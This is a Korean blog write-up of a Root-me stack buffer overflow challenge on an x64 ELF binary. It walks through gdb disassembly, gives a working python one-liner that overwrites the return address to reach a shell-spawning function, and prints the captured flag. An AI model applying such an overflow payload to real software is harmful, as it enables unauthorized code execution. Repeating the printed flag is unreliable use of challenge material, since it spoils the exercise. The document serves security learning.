---
layout: post
title: [Root-me] ELF x64 stack buffer over flow - basic
date: 2018-07-22 22:41:20 +0900
description: # Add post description (optional)
img: post-2.jpg # Add image post (optional)
tags: [CTF, Root-me]
author: purelledhand # Add name author (optional)
---

# 서론 : write-up

함수들을 조회해보면 아래와 같당

    gdb$ info func
    All defined functions:

    Non-debugging symbols:
    0x0000000000400528  _init
    0x0000000000400560  strlen@plt
    0x0000000000400570  system@plt
    0x0000000000400580  printf@plt
    0x0000000000400590  geteuid@plt
    0x00000000004005a0  __libc_start_main@plt
    0x00000000004005b0  __gmon_start__@plt
    0x00000000004005c0  setreuid@plt
    0x00000000004005d0  __isoc99_scanf@plt
    0x00000000004005e0  _start
    0x0000000000400610  deregister_tm_clones
    0x0000000000400640  register_tm_clones
    0x0000000000400680  __do_global_dtors_aux
    0x00000000004006a0  frame_dummy
    0x00000000004006cd  callMeMaybe
    0x00000000004006fc  main
    0x0000000000400760  __libc_csu_init
    0x00000000004007d0  __libc_csu_fini
    0x00000000004007d4  _fini


main에서는 호출되지 않는 callMeMaybe함수를 rip 핸들링을 통해 호출시키는 문제였다.

    gdb$ disas callMeMaybe
    Dump of assembler code for function callMeMaybe:
    0x00000000004006cd <+0>:	push   rbp
    0x00000000004006ce <+1>:	mov    rbp,rsp
    0x00000000004006d1 <+4>:	push   rbx
    0x00000000004006d2 <+5>:	sub    rsp,0x8
    0x00000000004006d6 <+9>:	call   0x400590 <geteuid@plt>
    0x00000000004006db <+14>:	mov    ebx,eax
    0x00000000004006dd <+16>:	call   0x400590 <geteuid@plt>
    0x00000000004006e2 <+21>:	mov    esi,ebx
    0x00000000004006e4 <+23>:	mov    edi,eax
    0x00000000004006e6 <+25>:	call   0x4005c0 <setreuid@plt>
    0x00000000004006eb <+30>:	mov    edi,0x4007e4
    0x00000000004006f0 <+35>:	call   0x400570 <system@plt>
    0x00000000004006f5 <+40>:	add    rsp,0x8
    0x00000000004006f9 <+44>:	pop    rbx
    0x00000000004006fa <+45>:	pop    rbp
    0x00000000004006fb <+46>:	ret    


해당 callMeMaybe함수를 보면 <+30> 라인부터 0x4007e4에 있는 문자열을 system함수의 인자로 넣어 실행시키는 것을 알 수 있다.

    gdb$ x/s 0x4007e4
    0x4007e4:	"/bin/bash"

그 주소에 있는 문자열은 위와 같이 "/bin/bash"였으며 따라서 callMeMaybe함수의 주소를 eip 값으로 넣으면 쉘을 딸 수 있음을 알 수 있었다.

    gdb$ disas main
    Dump of assembler code for function main:
    0x00000000004006fc <+0>:	push   rbp
    0x00000000004006fd <+1>:	mov    rbp,rsp
    0x0000000000400700 <+4>:	sub    rsp,0x120
    0x0000000000400707 <+11>:	mov    DWORD PTR [rbp-0x114],edi
    0x000000000040070d <+17>:	mov    QWORD PTR [rbp-0x120],rsi
    0x0000000000400714 <+24>:	lea    rax,[rbp-0x110]
    0x000000000040071b <+31>:	mov    rsi,rax
    0x000000000040071e <+34>:	mov    edi,0x4007ee
    0x0000000000400723 <+39>:	mov    eax,0x0
    0x0000000000400728 <+44>:	call   0x4005d0 <__isoc99_scanf@plt>
    0x000000000040072d <+49>:	lea    rax,[rbp-0x110]
    0x0000000000400734 <+56>:	mov    rdi,rax
    0x0000000000400737 <+59>:	call   0x400560 <strlen@plt>
    0x000000000040073c <+64>:	mov    DWORD PTR [rbp-0x4],eax
    0x000000000040073f <+67>:	lea    rax,[rbp-0x110]
    0x0000000000400746 <+74>:	mov    rsi,rax
    0x0000000000400749 <+77>:	mov    edi,0x4007f1
    0x000000000040074e <+82>:	mov    eax,0x0
    0x0000000000400753 <+87>:	call   0x400580 <printf@plt>
    0x0000000000400758 <+92>:	mov    eax,0x0
    0x000000000040075d <+97>:	leave  
    0x000000000040075e <+98>:	ret    
    End of assembler dump.


main 함수의 어셈블리를 보면 0x100의 인자를 scanf로 받은 후 Hello [인자] 형태를 printf로 출력해주는 프로그램임을 알 수 있다. (아래 참조)

    app-systeme-ch35@challenge03:~$ ./ch35
    AAAA
    Hello AAAA

scanf함수에 넣은 값은 rbp-0x110부터 들어간다.

    gdb$ x/s $rbp-0x110
    0x38b07867980:	'A' <repeats 47 times>

이제 ret의 주소가 rbp+8이므로 페이로드를 'A'*0x118+[callMeMaybe() 주소값]으로 작성해서 ret값을 callMeMaybe함수의 주소로 덮으면 된다!

    app-systeme-ch35@challenge03:~$ (python -c 'print "A"*0x118+"\xcd\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./ch35
    Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
    ls -al
    total 28
    drwxr-x---  2 app-systeme-ch35-cracked app-systeme-ch35         4096 mai   25  2015 .
    drwxr-xr-x 35 root                     root                     4096 mars  17 09:33 ..
    -rwsr-x---  1 app-systeme-ch35-cracked app-systeme-ch35         8633 mai   24  2015 ch35
    -rw-r-----  1 app-systeme-ch35-cracked app-systeme-ch35          447 mai   24  2015 ch35.c
    -r--------  1 app-systeme-ch35-cracked app-systeme-ch35-cracked   20 mai   24  2015 .passwd
    id
    uid=1235(app-systeme-ch35-cracked) gid=1135(app-systeme-ch35) groups=1235(app-systeme-ch35-cracked),100(users),1135(app-systeme-ch35)
    cat .passwd
    B4sicBufferOverflow
    
풀고 나서 다른 분이 쓰신 라업을 봤는데 페이로드에 주소값을 그냥 빅엔디안으로 쓰고 [:: - 1]을 이용해서 리틀엔디안으로 처리하시더랑
되게 좋은 꿀팁이었당 앞으로 나도 애용해야겠다.


# 본론 : 내가 배운 것


이전에 풀었던 문제들과 비슷한 패턴이었음에도 불구하고 오랫동안 삽질을 했다.

아직 체계가 흐릿하게 잡혔지만 **64비트 바이너리에서 rbp+8이 ret임을 확인**해갔던 과정을 포스팅하면서 다시 정리하고자 한다.

    gdb$ i r
    rax            0x1	0x1
    rbx            0x0	0x0
    rcx            0x0	0x0
    rdx            0x1	0x1
    rsi            0x30d8368e9f0	0x30d8368e9f0
    rdi            0x30d8368d640	0x30d8368d640
    rbp            0x38b27699850	0x38b27699850
    rsp            0x38b27699730	0x38b27699730
    rip            0x40072d	0x40072d <main+49>

    gdb$ x/10gx $rbp+8
    0x38b27699858:	0x0000030d832eff45	0x0000038b27699938

보면 rip의 값은 0x40072d로 다음에 실행될 명령어의 주소를 의미한다.
하지만 rbp+8의 값은 0x40072d가 아닌 값이라 낯설 수 있다.

rbp+8 값의 인스트럭트를 따라가보면 도중에 아래와 같은 내용이 나온다.

    0x0000030d832eff43 <+243>:	call   rax
    0x0000030d832eff45 <+245>:	mov    edi,eax
    0x0000030d832eff47 <+247>:	call   0x30d8330a1e0 <__GI_exit>


<+243> call rax에서 rax의 값을 확인하기 위해 0x0000030d832eff43에 브레이크 포인트(이하 브포)를 걸었다.
이 때 __libc_start_main+0xf3 처럼 주소가 아닌 __libc_start_main으로부터의 오프셋으로 설정해야 브포가 걸렸다. 오프셋도 헥스값으로 주지않으면 브포가 걸리지 않는다.

    gdb$ b *__libc_start_main+0xf3
    Breakpoint 2 at 0x30d832eff43: file libc-start.c, line 287.

    gdb$ i r
    rax            0x4006fc	0x4006fc

이렇게 rax에 main함수의 주소인 0x4006fc가 들어있는 것을 확인할 수 있었다.
정리해보면 함수가 끝난 후 main을 호출하고 exit를 호출하는 로직이다.

<img src="../assets/img/rootme/system4/stack.jpg" alt="stack" style="width: 400px;"/>

그래서 main을 호출 한 후 return addr이 mov edi, eax가 된 상황이다. 그 이후에는 exit를 호출한 후 main으로 복귀할 것이다.

# 결론

> 1. 64비트 바이너리 환경에서 rbp와 rip, ret의 관계 체계를 정리해볼 수 있었다.
> 2. 페이로드 작성 시 힘들게 리틀엔디안으로 바꾸지 말고 [:: - 1]을 이용하자